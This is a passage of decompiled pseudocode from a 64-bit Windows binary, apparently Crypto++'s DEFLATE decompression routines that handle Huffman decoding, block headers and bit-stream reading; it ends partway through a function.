signed __int64 __fastcall sub_140093690(unsigned __int64 a1)
{
  signed __int64 result; // rax
  char v2; // [rsp+28h] [rbp-80h]
  __int64 v3; // [rsp+38h] [rbp-70h]
  __int64 v4; // [rsp+40h] [rbp-68h]
  __int64 (__fastcall **v5)(void *); // [rsp+50h] [rbp-58h]
  int v6; // [rsp+68h] [rbp-40h]
  char Dst; // [rsp+70h] [rbp-38h]
  __int64 v8; // [rsp+80h] [rbp-28h]
  __int64 v9; // [rsp+88h] [rbp-20h]

  result = 768614336404564650i64;
  if ( a1 > 0xAAAAAAAAAAAAAAAi64 )
  {
    v4 = 15i64;
    v3 = 0i64;
    v2 = 0;
    sub_140004F20(&v2, byte_1400A3400, 0i64);
    std::exception::exception((std::exception *)&v5);
    v5 = &off_1400A8798;
    v6 = 1;
    v9 = 15i64;
    v8 = 0i64;
    Dst = 0;
    sub_140004DF0(&Dst, &v2, 0i64, 0xFFFFFFFFFFFFFFFFui64);
    v5 = &off_1400A8798;
    CxxThrowException(&v5, &_TI3_AVcls_001_CryptoPP__);
  }
  return result;
}
// 1400862C8: using guessed type __int64 __fastcall CxxThrowException(_QWORD, _QWORD);
// 1400A1930: using guessed type _QWORD std::exception::exception(std::exception *__hidden this);
// 1400A8798: using guessed type __int64 (__fastcall *off_1400A8798)(void *);
// 1400D3B30: using guessed type int _TI3_AVcls_001_CryptoPP__;

//----- (0000000140093780) ----------------------------------------------------
__int64 __fastcall sub_140093780(__int64 a1, unsigned int a2, _DWORD *a3)
{
  __int64 v3; // rax
  _DWORD *v4; // r14
  unsigned int v5; // er8
  unsigned int v6; // edi
  __int64 v7; // rsi
  _DWORD *v8; // rbx
  int v9; // er9
  int v10; // edx
  unsigned int v11; // ecx
  __int64 result; // rax
  unsigned __int64 v13; // r9
  __int64 v14; // r9
  signed __int64 v15; // rcx

  v3 = *(_QWORD *)(a1 + 40);
  v4 = a3;
  v5 = a2;
  v6 = 0;
  v7 = a1;
  v8 = (_DWORD *)(v3 + 24i64 * (a2 & *(_DWORD *)(a1 + 8)));
  v9 = *(_DWORD *)(v3 + 24i64 * (a2 & *(_DWORD *)(a1 + 8)));
  if ( v9 != 1 )
  {
    v10 = 2 * a2 ^ (2 * a2 ^ (a2 >> 1)) & 0x55555555;
    v11 = 4 * v10 ^ (4 * v10 ^ ((2 * v5 ^ (2 * v5 ^ (v5 >> 1)) & 0x55555555) >> 2)) & 0x33333333;
    v6 = _byteswap_ulong(16 * v11 ^ (16 * v11 ^ (v11 >> 4)) & 0xF0F0F0F);
  }
  if ( !v9 )
    sub_1400945D0(v7, (__int64)v8, v6);
  if ( *v8 == 1 )
  {
    *v4 = v8[2];
    result = (unsigned int)v8[4];
  }
  else
  {
    if ( *v8 == 2 )
    {
      v13 = *((_QWORD *)v8 + 1)
          + 12 * ((unsigned __int64)(v6 << *(_DWORD *)(v7 + 4)) >> (*(_BYTE *)(v7 + 4) - *((_BYTE *)v8 + 16) + 32));
    }
    else
    {
      v14 = *((_QWORD *)v8 + 1);
      v15 = ((unsigned __int64)((unsigned __int128)((*((_QWORD *)v8 + 2) - v14) * (signed __int128)3074457345618258603i64) >> 64) >> 63)
          + ((signed __int64)((unsigned __int128)((*((_QWORD *)v8 + 2) - v14) * (signed __int128)3074457345618258603i64) >> 64) >> 1);
      while ( v15 > 0 )
      {
        if ( v6 < *(_DWORD *)(v14 + 12 * (v15 / 2)) )
        {
          v15 /= 2i64;
        }
        else
        {
          v14 += 12 * (v15 / 2) + 12;
          v15 += -1 - v15 / 2;
        }
      }
      v13 = v14 - 12;
    }
    *v4 = *(_DWORD *)(v13 + 8);
    result = *(unsigned int *)(v13 + 4);
  }
  return result;
}

//----- (00000001400938F0) ----------------------------------------------------
char __fastcall sub_1400938F0(unsigned int *a1, unsigned int *a2, _DWORD *a3)
{
  unsigned int v3; // edi
  _DWORD *v4; // rbp
  unsigned int *v5; // rbx
  __int64 v6; // rsi
  unsigned int v7; // ecx
  unsigned int v8; // eax
  unsigned int v9; // edx
  char result; // al
  int v11; // edx
  unsigned __int8 v12; // [rsp+30h] [rbp+8h]

  v3 = *a1;
  v4 = a3;
  v5 = a2;
  v6 = (__int64)a1;
  if ( a2[3] < *a1 )
  {
    do
    {
      if ( !(*(__int64 (__fastcall **)(_QWORD, unsigned __int8 *))(**(_QWORD **)v5 + 144i64))(*(_QWORD *)v5, &v12) )
        break;
      v7 = v5[3];
      v5[2] |= v12 << v7;
      v5[3] = v7 + 8;
    }
    while ( v7 + 8 < v3 );
  }
  v8 = sub_140093780(v6, v5[2], v4);
  v9 = v5[3];
  if ( v8 > v9 )
    return 0;
  v5[2] >>= v8;
  v11 = v9 - v8;
  result = 1;
  v5[3] = v11;
  return result;
}

//----- (0000000140093980) ----------------------------------------------------
__int64 __fastcall sub_140093980(__int64 a1)
{
  __int64 v1; // rbx
  unsigned __int8 v2; // r15
  char v3; // cl
  unsigned int v4; // er14
  unsigned int *v5; // r13
  unsigned int *v6; // r12
  int v7; // ecx
  int v8; // ecx
  int v9; // ecx
  unsigned int v10; // eax
  unsigned int v11; // edi
  unsigned int v12; // edi
  unsigned int v13; // er8
  char *v14; // rax
  unsigned __int64 v15; // rdx
  bool v16; // zf
  int v17; // ecx
  unsigned int v18; // eax
  unsigned __int64 v19; // rdi
  char *v20; // rax
  __int64 v21; // rsi
  unsigned int v22; // ecx
  char v23; // cl
  void *v24; // rdx
  unsigned __int8 v26; // [rsp+0h] [rbp-49h]
  unsigned __int64 v27; // [rsp+8h] [rbp-41h]
  __int64 v28; // [rsp+10h] [rbp-39h]
  char v29; // [rsp+18h] [rbp-31h]
  char v30; // [rsp+1Dh] [rbp-2Ch]
  unsigned __int64 v31; // [rsp+20h] [rbp-29h]
  void *Memory; // [rsp+28h] [rbp-21h]
  char v33; // [rsp+30h] [rbp-19h]

  v28 = -2i64;
  v1 = a1;
  v2 = 0;
  v3 = *(_BYTE *)(a1 + 143);
  v4 = 0;
  if ( !v3 )
  {
    if ( sub_140056DB0((_QWORD *)(v1 + 56)) )
      return v2;
    while ( !v2 )
    {
      v14 = (char *)sub_140057240((_QWORD *)(v1 + 56), &v27);
      v15 = *(unsigned __int16 *)(v1 + 144);
      if ( v27 < v15 )
        LOWORD(v15) = v27;
      sub_140095490(v1, v14, (unsigned __int16)v15);
      (*(void (__fastcall **)(__int64, unsigned __int64))(*(_QWORD *)(v1 + 56) + 168i64))(v1 + 56, v27);
      v16 = *(_WORD *)(v1 + 144) == (_WORD)v27;
      *(_WORD *)(v1 + 144) -= v27;
      v2 = 0;
      if ( v16 )
        v2 = 1;
      if ( sub_140056DB0((_QWORD *)(v1 + 56)) )
        goto LABEL_38;
    }
    goto LABEL_39;
  }
  if ( (unsigned __int8)(v3 - 1) > 1u )
    return v2;
  if ( v3 == 1 )
    v5 = (unsigned int *)sub_1400959D0(&v26);
  else
    v5 = (unsigned int *)(v1 + 160);
  if ( *(_BYTE *)(v1 + 143) == 1 )
    v6 = (unsigned int *)sub_140095930(&v26);
  else
    v6 = (unsigned int *)(v1 + 224);
  v7 = *(_DWORD *)(v1 + 148);
  if ( !v7 )
  {
    while ( 1 )
    {
LABEL_14:
      if ( !sub_1400938F0(v5, (unsigned int *)(v1 + 288), (_DWORD *)(v1 + 152)) )
      {
        *(_DWORD *)(v1 + 148) = 0;
        goto LABEL_38;
      }
      v10 = *(_DWORD *)(v1 + 152);
      if ( v10 >= 0x100 )
        break;
      sub_140095230((_QWORD *)v1, v10);
    }
    if ( v10 == 256 )
    {
      v2 = 1;
      goto LABEL_39;
    }
    if ( v10 > 0x11D )
    {
      sub_140093100(&v33);
      CxxThrowException(&v33, &_TI4_AVcls_092_cls_087_CryptoPP__);
    }
    goto LABEL_19;
  }
  v8 = v7 - 1;
  if ( !v8 )
  {
LABEL_19:
    v11 = dword_1400B6C60[*(_DWORD *)(v1 + 152) - 257];
    if ( !sub_140094570((_DWORD *)(v1 + 288), v11) )
    {
      *(_DWORD *)(v1 + 148) = 1;
      goto LABEL_38;
    }
    *(_DWORD *)(v1 + 152) = dword_1400B6BE0[*(_DWORD *)(v1 + 152) - 257]
                          + (unsigned __int64)sub_140094720((_DWORD *)(v1 + 288), v11);
    goto LABEL_21;
  }
  v9 = v8 - 1;
  if ( !v9 )
  {
LABEL_21:
    if ( !sub_1400938F0(v6, (unsigned int *)(v1 + 288), (_DWORD *)(v1 + 156)) )
    {
      *(_DWORD *)(v1 + 148) = 2;
      goto LABEL_38;
    }
    goto LABEL_22;
  }
  if ( v9 != 1 )
    return v2;
LABEL_22:
  v12 = dword_1400B6D60[*(unsigned int *)(v1 + 156)];
  if ( sub_140094570((_DWORD *)(v1 + 288), v12) )
  {
    v13 = (unsigned __int64)sub_140094720((_DWORD *)(v1 + 288), v12) + dword_1400B6CE0[*(unsigned int *)(v1 + 156)];
    *(_DWORD *)(v1 + 156) = v13;
    sub_1400952A0(v1, *(_DWORD *)(v1 + 152), v13);
    goto LABEL_14;
  }
  *(_DWORD *)(v1 + 148) = 3;
LABEL_38:
  if ( !v2 )
    return v2;
LABEL_39:
  if ( *(_BYTE *)(v1 + 141) )
  {
    if ( *(_DWORD *)(v1 + 136) )
    {
      (*(void (__fastcall **)(__int64, _QWORD, _QWORD))(*(_QWORD *)v1 + 400i64))(
        v1,
        *(_QWORD *)(v1 + 336) + *(_QWORD *)(v1 + 320),
        *(_QWORD *)(v1 + 328) - *(_QWORD *)(v1 + 336));
      *(_QWORD *)(v1 + 336) = *(_QWORD *)(v1 + 328);
    }
    v17 = *(_DWORD *)(v1 + 300) & 7;
    *(_DWORD *)(v1 + 296) >>= *(_BYTE *)(v1 + 300) & 7;
    v16 = *(_DWORD *)(v1 + 300) == v17;
    *(_DWORD *)(v1 + 300) -= v17;
    v18 = *(_DWORD *)(v1 + 300);
    if ( !v16 )
    {
      v19 = (unsigned __int64)v18 >> 3;
      v30 = 0;
      v31 = v19;
      if ( v19 > 4 )
      {
        sub_1400255A0((unsigned __int64)v18 >> 3);
        if ( v19 )
          v20 = (char *)sub_14003A000(v19);
        else
          v20 = 0i64;
        v19 = v31;
      }
      else
      {
        v30 = 1;
        v20 = &v29;
      }
      Memory = v20;
      if ( v19 )
      {
        v21 = 0i64;
        do
        {
          if ( *(_DWORD *)(v1 + 300) < 8u )
          {
            do
            {
              if ( !(*(__int64 (__fastcall **)(_QWORD, unsigned __int8 *))(**(_QWORD **)(v1 + 288) + 144i64))(
                      *(_QWORD *)(v1 + 288),
                      &v26) )
                break;
              v22 = *(_DWORD *)(v1 + 300);
              *(_DWORD *)(v1 + 296) |= v26 << v22;
              *(_DWORD *)(v1 + 300) = v22 + 8;
            }
            while ( v22 >= 0xFFFFFFF8 );
          }
          v23 = *(_DWORD *)(v1 + 296);
          *(_DWORD *)(v1 + 296) >>= 8;
          *(_DWORD *)(v1 + 300) -= 8;
          *((_BYTE *)Memory + v21) = v23;
          v21 = ++v4;
          v19 = v31;
        }
        while ( v4 < v31 );
      }
      sub_140057570(v1 + 56, Memory, v19);
      v24 = Memory;
      if ( Memory == &v29 )
      {
        memset(Memory, 0, v31);
      }
      else
      {
        memset(Memory, 0, v31);
        free(v24);
      }
    }
    *(_DWORD *)(v1 + 136) = 3;
  }
  else
  {
    *(_DWORD *)(v1 + 136) = 1;
  }
  return v2;
}
// 140057570: using guessed type __int64 __fastcall sub_140057570(_QWORD, _QWORD, _QWORD);
// 1400862C8: using guessed type __int64 __fastcall CxxThrowException(_QWORD, _QWORD);
// 140095930: using guessed type __int64 __fastcall sub_140095930(_QWORD);
// 1400959D0: using guessed type __int64 __fastcall sub_1400959D0(_QWORD);
// 1400B6C60: using guessed type int dword_1400B6C60[];
// 1400B6D60: using guessed type int dword_1400B6D60[];
// 1400D4B68: using guessed type int _TI4_AVcls_092_cls_087_CryptoPP__;

//----- (0000000140093E00) ----------------------------------------------------
__int64 __fastcall sub_140093E00(__int64 a1)
{
  __int64 v1; // rbx
  _DWORD *v2; // rdi
  int v3; // ecx
  int v4; // ecx
  char v5; // cl
  int v6; // ecx
  int v7; // ecx
  __int64 result; // rax
  __int64 v9; // r13
  int v10; // eax
  int v11; // er14
  int v12; // eax
  unsigned int *v13; // rsi
  unsigned int v14; // eax
  unsigned int *v15; // r14
  __int64 v16; // r15
  unsigned int v17; // edi
  unsigned int v18; // er15
  unsigned int v19; // er14
  unsigned int v20; // esi
  int v21; // ecx
  unsigned int v22; // eax
  unsigned int v23; // edx
  int v24; // ecx
  int v25; // ecx
  int v26; // ecx
  int v27; // er8
  __int64 v28; // rcx
  unsigned int *v29; // rdi
  __int64 i; // rcx
  unsigned int *v31; // rdi
  __int64 j; // rcx
  int v33; // ecx
  unsigned __int8 v34; // [rsp+20h] [rbp-8E8h]
  unsigned __int8 v35; // [rsp+21h] [rbp-8E7h]
  unsigned __int8 v36; // [rsp+22h] [rbp-8E6h]
  unsigned __int8 v37; // [rsp+23h] [rbp-8E5h]
  int v38; // [rsp+24h] [rbp-8E4h]
  unsigned int v39; // [rsp+28h] [rbp-8E0h]
  __int64 v40; // [rsp+30h] [rbp-8D8h]
  __int64 v41; // [rsp+38h] [rbp-8D0h]
  __int128 v42; // [rsp+40h] [rbp-8C8h]
  __int64 v43; // [rsp+50h] [rbp-8B8h]
  __int64 v44; // [rsp+58h] [rbp-8B0h]
  __int128 v45; // [rsp+60h] [rbp-8A8h]
  __int64 v46; // [rsp+70h] [rbp-898h]
  char v47; // [rsp+80h] [rbp-888h]
  char v48; // [rsp+C0h] [rbp-848h]
  char v49; // [rsp+100h] [rbp-808h]
  char v50; // [rsp+140h] [rbp-7C8h]
  char v51; // [rsp+180h] [rbp-788h]
  char v52; // [rsp+1C0h] [rbp-748h]
  char v53; // [rsp+200h] [rbp-708h]
  char v54; // [rsp+280h] [rbp-688h]
  char v55; // [rsp+2C0h] [rbp-648h]
  char v56; // [rsp+300h] [rbp-608h]
  char v57; // [rsp+340h] [rbp-5C8h]
  char v58; // [rsp+380h] [rbp-588h]
  __int64 v59; // [rsp+3C0h] [rbp-548h]
  __int64 v60; // [rsp+3C8h] [rbp-540h]
  __int64 v61; // [rsp+3D0h] [rbp-538h]
  __int64 v62; // [rsp+3D8h] [rbp-530h]
  __int64 v63; // [rsp+3E0h] [rbp-528h]
  __int64 v64; // [rsp+3E8h] [rbp-520h]
  __int64 v65; // [rsp+3F0h] [rbp-518h]
  __int64 v66; // [rsp+3F8h] [rbp-510h]
  __int64 v67; // [rsp+400h] [rbp-508h]
  int v68; // [rsp+408h] [rbp-500h]
  char v69; // [rsp+8B9h] [rbp-4Fh]
  __int64 v70; // [rsp+8C0h] [rbp-48h]
  unsigned int *v71; // [rsp+8C8h] [rbp-40h]

  v46 = -2i64;
  v1 = a1;
  v2 = (_DWORD *)(a1 + 288);
  if ( *(_DWORD *)(a1 + 300) < 3u )
  {
    do
    {
      if ( !(*(__int64 (__fastcall **)(_QWORD, unsigned __int8 *))(**(_QWORD **)v2 + 144i64))(*(_QWORD *)v2, &v34) )
      {
        sub_1400931E0(&v54);
        CxxThrowException(&v54, &_TI4_AVcls_093_cls_087_CryptoPP__);
      }
      v3 = v2[3];
      v2[2] |= v34 << v3;
      v2[3] = v3 + 8;
    }
    while ( (unsigned int)(v3 + 8) < 3 );
  }
  if ( v2[3] < 1u )
  {
    do
    {
      if ( !(*(__int64 (__fastcall **)(_QWORD, unsigned __int8 *))(**(_QWORD **)v2 + 144i64))(*(_QWORD *)v2, &v34) )
        break;
      v4 = v2[3];
      v2[2] |= v34 << v4;
      v2[3] = v4 + 8;
    }
    while ( (unsigned int)(v4 + 8) < 1 );
  }
  v5 = v2[2];
  v2[2] >>= 1;
  --v2[3];
  *(_BYTE *)(v1 + 141) = (v5 & 1) != 0;
  if ( v2[3] < 2u )
  {
    do
    {
      if ( !(*(__int64 (__fastcall **)(_QWORD, unsigned __int8 *))(**(_QWORD **)v2 + 144i64))(*(_QWORD *)v2, &v34) )
        break;
      v6 = v2[3];
      v2[2] |= v34 << v6;
      v2[3] = v6 + 8;
    }
    while ( (unsigned int)(v6 + 8) < 2 );
  }
  v7 = v2[2] & 3;
  result = (unsigned int)(v2[2] >> 2);
  v2[2] = result;
  v2[3] -= 2;
  *(_BYTE *)(v1 + 143) = v7;
  if ( (_BYTE)v7 )
  {
    if ( v7 == 1 )
    {
      *(_DWORD *)(v1 + 148) = 0;
    }
    else
    {
      if ( v7 != 2 )
      {
        sub_140093100(&v49);
        CxxThrowException(&v49, &_TI4_AVcls_092_cls_087_CryptoPP__);
      }
      if ( !sub_140094570(v2, 0xEu) )
      {
        sub_1400931E0(&v47);
        CxxThrowException(&v47, &_TI4_AVcls_093_cls_087_CryptoPP__);
      }
      v9 = (unsigned int)sub_140094720(v2, 5u);
      v10 = sub_140094720(v2, 5u);
      v11 = v10;
      v38 = v10;
      v12 = sub_140094720(v2, 4u);
      v70 = 318i64;
      v69 = 1;
      v13 = (unsigned int *)&v59;
      v71 = (unsigned int *)&v59;
      v59 = 0i64;
      v60 = 0i64;
      v61 = 0i64;
      v62 = 0i64;
      v63 = 0i64;
      v64 = 0i64;
      v65 = 0i64;
      v66 = 0i64;
      v67 = 0i64;
      v68 = 0;
      v14 = v12 + 4;
      if ( v14 )
      {
        v15 = (unsigned int *)&unk_1400B6B90;
        v16 = v14;
        do
        {
          v13[*v15] = sub_140094720(v2, 3u);
          ++v15;
          v13 = v71;
          --v16;
        }
        while ( v16 );
        v11 = v38;
      }
      v40 = 0i64;
      v41 = 0i64;
      _mm_store_si128((__m128i *)&v42, (__m128i)0i64);
      v43 = 0i64;
      v44 = 0i64;
      _mm_store_si128((__m128i *)&v45, (__m128i)0i64);
      sub_140094790((unsigned int *)&v40, v13, 0x13u);
      v17 = 0;
      v18 = v40;
      while ( v17 < v11 + (signed int)v9 + 258 )
      {
        v39 = 0;
        v19 = 0;
        v20 = 0;
        while ( *(_DWORD *)(v1 + 300) < v18
             && (*(__int64 (__fastcall **)(_QWORD, unsigned __int8 *))(**(_QWORD **)(v1 + 288) + 144i64))(
                  *(_QWORD *)(v1 + 288),
                  &v34) )
        {
          v21 = *(_DWORD *)(v1 + 300);
          *(_DWORD *)(v1 + 296) |= v34 << v21;
          *(_DWORD *)(v1 + 300) = v21 + 8;
        }
        v22 = sub_140093780((__int64)&v40, *(_DWORD *)(v1 + 296), &v39);
        v23 = *(_DWORD *)(v1 + 300);
        if ( v22 > v23 )
        {
          sub_1400931E0(&v50);
          CxxThrowException(&v50, &_TI4_AVcls_093_cls_087_CryptoPP__);
        }
        *(_DWORD *)(v1 + 296) >>= v22;
        *(_DWORD *)(v1 + 300) = v23 - v22;
        if ( v39 > 0xF )
        {
          switch ( v39 )
          {
            case 0x10u:
              while ( *(_DWORD *)(v1 + 300) < 2u )
              {
                if ( !(*(__int64 (__fastcall **)(_QWORD, unsigned __int8 *))(**(_QWORD **)(v1 + 288) + 144i64))(
                        *(_QWORD *)(v1 + 288),
                        &v35) )
                {
                  sub_1400931E0(&v53);
                  CxxThrowException(&v53, &_TI4_AVcls_093_cls_087_CryptoPP__);
                }
                v26 = *(_DWORD *)(v1 + 300);
                *(_DWORD *)(v1 + 296) |= v35 << v26;
                *(_DWORD *)(v1 + 300) = v26 + 8;
              }
              v19 = (unsigned __int64)sub_140094720((_DWORD *)(v1 + 288), 2u) + 3;
              if ( !v17 )
              {
                sub_140093100(&v56);
                CxxThrowException(&v56, &_TI4_AVcls_092_cls_087_CryptoPP__);
              }
              v20 = v71[v17 - 1];
              break;
            case 0x11u:
              while ( *(_DWORD *)(v1 + 300) < 3u )
              {
                if ( !(*(__int64 (__fastcall **)(_QWORD, unsigned __int8 *))(**(_QWORD **)(v1 + 288) + 144i64))(
                        *(_QWORD *)(v1 + 288),
                        &v36) )
                {
                  sub_1400931E0(&v58);
                  CxxThrowException(&v58, &_TI4_AVcls_093_cls_087_CryptoPP__);
                }
                v25 = *(_DWORD *)(v1 + 300);
                *(_DWORD *)(v1 + 296) |= v36 << v25;
                *(_DWORD *)(v1 + 300) = v25 + 8;
              }
              v19 = (unsigned __int64)sub_140094720((_DWORD *)(v1 + 288), 3u) + 3;
              v20 = 0;
              break;
            case 0x12u:
              while ( *(_DWORD *)(v1 + 300) < 7u )
              {
                if ( !(*(__int64 (__fastcall **)(_QWORD, unsigned __int8 *))(**(_QWORD **)(v1 + 288) + 144i64))(
                        *(_QWORD *)(v1 + 288),
                        &v37) )
                {
                  sub_1400931E0(&v51);
                  CxxThrowException(&v51, &_TI4_AVcls_093_cls_087_CryptoPP__);
                }
                v24 = *(_DWORD *)(v1 + 300);
                *(_DWORD *)(v1 + 296) |= v37 << v24;
                *(_DWORD *)(v1 + 300) = v24 + 8;
              }
              v19 = (unsigned __int64)sub_140094720((_DWORD *)(v1 + 288), 7u) + 11;
              v20 = 0;
              break;
          }
        }
        else
        {
          v19 = 1;
          v20 = v39;
        }
        v27 = v19 + v17;
        if ( v19 + v17 > (signed int)v9 + v38 + 258 )
        {
          sub_140093100(&v48);
          CxxThrowException(&v48, &_TI4_AVcls_092_cls_087_CryptoPP__);
        }
        v28 = v17;
        v29 = &v71[v17];
        for ( i = (__int64)&v71[v28 + v19]; v29 != (unsigned int *)i; ++v29 )
          *v29 = v20;
        v17 = v27;
        v11 = v38;
      }
      sub_140094790((unsigned int *)(v1 + 160), v71, v9 + 257);
      if ( v11 || v71[(unsigned int)(v9 + 257)] )
      {
        sub_140094790((unsigned int *)(v1 + 224), &v71[v9 + 257], v11 + 1);
      }
      else if ( (_DWORD)v9 )
      {
        sub_140093100(&v52);
        CxxThrowException(&v52, &_TI4_AVcls_092_cls_087_CryptoPP__);
      }
      *(_DWORD *)(v1 + 148) = 0;
      sub_1400913B0(&v40);
      result = (__int64)&v59;
      v31 = v71;
      if ( v71 == (unsigned int *)&v59 )
      {
        result = 0i64;
        for ( j = v70; j; --j )
        {
          *v31 = 0;
          ++v31;
        }
      }
    }
  }
  else
  {
    v33 = *(_DWORD *)(v1 + 300) & 7;
    v2[2] >>= v33;
    v2[3] -= v33;
    if ( !sub_140094570(v2, 0x20u) )
    {
      sub_1400931E0(&v55);
      CxxThrowException(&v55, &_TI4_AVcls_093_cls_087_CryptoPP__);
    }
    *(_WORD *)(v1 + 144) = sub_140094720(v2, 0x10u);
    result = sub_140094720(v2, 0x10u);
    if ( (_WORD)result != ~*(_WORD *)(v1 + 144) )
    {
      sub_140093100(&v57);
      CxxThrowException(&v57, &_TI4_AVcls_092_cls_087_CryptoPP__);
    }
  }
  *(_DWORD *)(v1 + 136) = 2;
  return result;
}
// 1400862C8: using guessed type __int64 __fastcall CxxThrowException(_QWORD, _QWORD);
// 1400D4B68: using guessed type int _TI4_AVcls_092_cls_087_CryptoPP__;
// 1400D4BD8: using guessed type int _TI4_AVcls_093_cls_087_CryptoPP__;

//----- (0000000140094570) ----------------------------------------------------
char __fastcall sub_140094570(_DWORD *a1, unsigned int a2)
{
  unsigned int v2; // edi
  _DWORD *v3; // rbx
  __int64 v4; // rax
  int v5; // ecx
  unsigned __int8 v7; // [rsp+38h] [rbp+10h]

  v2 = a2;
  v3 = a1;
  if ( a1[3] >= a2 )
  {
LABEL_4:
    LOBYTE(v4) = 1;
  }
  else
  {
    while ( 1 )
    {
      v4 = (*(__int64 (__fastcall **)(_QWORD, unsigned __int8 *))(**(_QWORD **)v3 + 144i64))(*(_QWORD *)v3, &v7);
      if ( !v4 )
        break;
      v5 = v3[3];
      v3[2] |= v7 << v5;
      v3[3] = v5 + 8;
      if ( v5 + 8 >= v2 )
        goto LABEL_4;
    }
  }
  return v4;
}

//----- (00000001400945D0) ----------------------------------------------------
__int64 __fastcall sub_1400945D0(__int64 a1, __int64 a2, int a3)
{
  __int64 v3; // r11
  unsigned int v4; // er8
  __int64 v5; // rdi
  signed __int64 v6; // r9
  signed __int64 v7; // r11
  __int64 result; // rax
  __int64 v9; // r9
  unsigned __int64 v10; // rcx
  signed __int64 v11; // rcx

  v3 = *(_QWORD *)(a1 + 16);
  v4 = *(_DWORD *)(a1 + 12) & a3;
  v5 = a1;
  v6 = ((unsigned __int64)((unsigned __int128)((*(_QWORD *)(a1 + 24) - v3) * (signed __int128)3074457345618258603i64) >> 64) >> 63)
     + ((signed __int64)((unsigned __int128)((*(_QWORD *)(a1 + 24) - v3) * (signed __int128)3074457345618258603i64) >> 64) >> 1);
  while ( v6 > 0 )
  {
    if ( v4 < *(_DWORD *)(v3 + 12 * (v6 / 2)) )
    {
      v6 /= 2i64;
    }
    else
    {
      v3 += 12 * (v6 / 2) + 12;
      v6 += -1 - v6 / 2;
    }
  }
  v7 = v3 - 12;
  if ( *(_DWORD *)(v7 + 4) > *(_DWORD *)(a1 + 4) )
  {
    *(_QWORD *)(a2 + 8) = v7;
    v9 = *(_QWORD *)(a1 + 16);
    v10 = (signed __int64)((unsigned __int128)((*(_QWORD *)(a1 + 24) - v9) * (signed __int128)3074457345618258603i64) >> 64) >> 1;
    v11 = (v10 >> 63) + v10;
    while ( v11 > 0 )
    {
      if ( v4 + ~*(_DWORD *)(v5 + 12) < *(_DWORD *)(v9 + 12 * (v11 / 2)) )
      {
        v11 /= 2i64;
      }
      else
      {
        v9 += 12 * (v11 / 2) + 12;
        v11 += -1 - v11 / 2;
      }
    }
    result = *(unsigned int *)(v9 - 8);
    if ( *(_DWORD *)(v7 + 4) == (_DWORD)result )
    {
      *(_DWORD *)a2 = 2;
      result = *(unsigned int *)(v7 + 4);
      *(_DWORD *)(a2 + 16) = result;
    }
    else
    {
      *(_DWORD *)a2 = 3;
      *(_QWORD *)(a2 + 16) = v9;
    }
  }
  else
  {
    *(_DWORD *)a2 = 1;
    *(_DWORD *)(a2 + 8) = *(_DWORD *)(v7 + 8);
    result = *(unsigned int *)(v7 + 4);
    *(_DWORD *)(a2 + 16) = result;
  }
  return result;
}

//----- (0000000140094720) ----------------------------------------------------
__int64 __fastcall sub_140094720(_DWORD *a1, unsigned int a2)
{
  unsigned int v2; // edi
  _DWORD *v3; // rbx
  int v4; // ecx
  unsigned int v5; // edx
  __int64 result; // rax
  unsigned __int8 v7; // [rsp+38h] [rbp+10h]

  v2 = a2;
  v3 = a1;
  if ( a1[3] < a2 )
  {
    do
    {
      if ( !(*(__int64 (__fastcall **)(_QWORD, unsigned __int8 *))(**(_QWORD **)v3 + 144i64))(*(_QWORD *)v3, &v7) )
        break;
      v4 = v3[3];
      v3[2] |= v7 << v4;
      v3[3] = v4 + 8;
    }
    while ( v4 + 8 < v2 );
  }
  v5 = v3[2];
  result = v5 & ((1 << v2) - 1);
  v3[3] -= v2;
  v3[2] = v5 >> v2;
  return result;
}

//----- (0000000140094790) ----------------------------------------------------
void __fastcall sub_140094790(unsigned int *a1, unsigned int *a2, unsigned int a3)
{
  unsigned int v3; // er12
  unsigned int *v4; // rsi
  unsigned int *v5; // r15
  __int64 v6; // r14
  signed __int64 v7; // rdi
  unsigned int *v8; // rcx
  unsigned int *i; // rdx
  unsigned int v10; // eax
  unsigned __int64 v11; // rdi
  char *v12; // rax
  unsigned __int64 v13; // rcx
  __int64 v14; // rdx
  unsigned __int64 v15; // rdi
  unsigned int *v16; // rdx
  unsigned int v17; // edi
  unsigned __int64 v18; // r14
  char *v19; // rax
  unsigned int j; // edx
  unsigned int v21; // eax
  __int64 v22; // r8
  unsigned __int64 v23; // rdx
  unsigned int v24; // er10
  unsigned int v25; // er8
  __int64 v26; // r9
  _DWORD *v27; // rdx
  int v28; // edi
  signed __int64 v29; // rcx
  int *v30; // rax
  int v31; // edx
  int v32; // eax
  __int64 v33; // rcx
  unsigned int v34; // er8
  __int64 v35; // rcx
  __int64 v36; // rdi
  __int64 v37; // rcx
  void *v38; // rdx
  _DWORD *v39; // rdi
  __int64 v40; // rcx
  void *v41; // rdx
  _DWORD *v42; // rdi
  __int64 v43; // rcx
  int v44; // [rsp+20h] [rbp-E0h]
  __int64 v45; // [rsp+28h] [rbp-D8h]
  void *v46; // [rsp+30h] [rbp-D0h]
  __int64 v47; // [rsp+40h] [rbp-C0h]
  unsigned __int64 v48; // [rsp+48h] [rbp-B8h]
  __int64 (__fastcall **v49)(void *); // [rsp+50h] [rbp-B0h]
  int v50; // [rsp+68h] [rbp-98h]
  char Dst; // [rsp+70h] [rbp-90h]
  __int64 v52; // [rsp+80h] [rbp-80h]
  __int64 v53; // [rsp+88h] [rbp-78h]
  char v54; // [rsp+90h] [rbp-70h]
  __int64 v55; // [rsp+A0h] [rbp-60h]
  __int64 v56; // [rsp+A8h] [rbp-58h]
  char v57; // [rsp+B0h] [rbp-50h]
  char v58; // [rsp+F1h] [rbp-Fh]
  unsigned __int64 v59; // [rsp+F8h] [rbp-8h]
  void *v60; // [rsp+100h] [rbp+0h]
  char v61; // [rsp+108h] [rbp+8h]
  char v62; // [rsp+149h] [rbp+49h]
  __int64 v63; // [rsp+150h] [rbp+50h]
  void *Memory; // [rsp+158h] [rbp+58h]

  v45 = -2i64;
  v3 = a3;
  v4 = a2;
  v5 = a1;
  if ( !a3 )
  {
    v56 = 15i64;
    v55 = 0i64;
    v54 = 0;
    sub_140004F20(&v54, "null code", 9ui64);
    v48 = 15i64;
    v47 = 0i64;
    LOBYTE(v46) = 0;
    sub_140004F20(&v46, byte_1400A3400, 0i64);
    std::exception::exception((std::exception *)&v49);
    v49 = &off_1400A8798;
    v50 = 4;
    v53 = 15i64;
    v52 = 0i64;
    Dst = 0;
    sub_140004DF0(&Dst, &v46, 0i64, 0xFFFFFFFFFFFFFFFFui64);
    if ( v48 >= 0x10 )
      operator delete(v46);
    v49 = &off_1400A8798;
    CxxThrowException(&v49, &_TI3_AVErr_cls_091_CryptoPP__);
  }
  v6 = a3;
  v7 = (signed __int64)&a2[a3];
